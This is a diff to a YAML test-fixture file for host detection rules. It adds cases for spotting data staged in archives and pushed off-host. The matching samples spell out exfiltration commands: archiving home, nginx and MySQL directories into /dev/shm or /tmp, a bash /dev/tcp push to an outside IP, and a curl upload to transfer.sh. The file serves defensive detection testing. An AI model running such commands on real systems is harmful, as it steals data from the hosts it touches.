@@ -236,3 +236,51 @@ linux_sshd_config_weakened:
       event:
         CommandLine: systemctl reload sshd
   also_fires: []
+
+linux_data_staged_in_archive:
+  matches:
+    - name: home and etc collected into memory-backed storage
+      event:
+        Image: /usr/bin/tar
+        CommandLine: tar -czf /dev/shm/h.tgz /home/deploy /etc/nginx
+    - name: a database directory zipped into tmp
+      event:
+        Image: /usr/bin/zip
+        CommandLine: zip -r /tmp/d.zip /var/lib/mysql
+  ignores:
+    - name: a source tree archived in place
+      event:
+        Image: /usr/bin/tar
+        CommandLine: tar -czf build/release.tgz ./dist
+  also_fires: []
+
+linux_file_pushed_offhost:
+  matches:
+    - name: an archive pushed through a bash builtin socket
+      event:
+        Image: /bin/bash
+        CommandLine: bash -c 'cat /dev/shm/h.tgz > /dev/tcp/185.7.2.9/443'
+    - name: uploaded to a transfer service
+      event:
+        Image: /usr/bin/curl
+        CommandLine: curl --upload-file /tmp/d.zip https://transfer.sh/d.zip
+  ignores:
+    - name: a scheduled rsync backup
+      event:
+        Image: /usr/bin/rsync
+        CommandLine: rsync -az --delete /srv/data/ backup-01:/srv/data/
+    - name: a port check with netcat
+      event:
+        Image: /usr/bin/nc
+        CommandLine: nc -z 10.0.0.5 443
+  # Both correct, and both worth keeping.
+  #
+  # A reverse shell and an exfiltration over /dev/tcp are the same mechanism
+  # pointed in opposite directions, so the two rules see each other's samples.
+  # And the drop-service list is shared with the Windows rule deliberately -
+  # transfer.sh does not care which operating system uploaded to it, and
+  # narrowing either rule to its own platform would mean a Linux host using a
+  # Windows-listed service went unseen.
+  also_fires:
+    - linux_reverse_shell
+    - win_upload_from_script_host
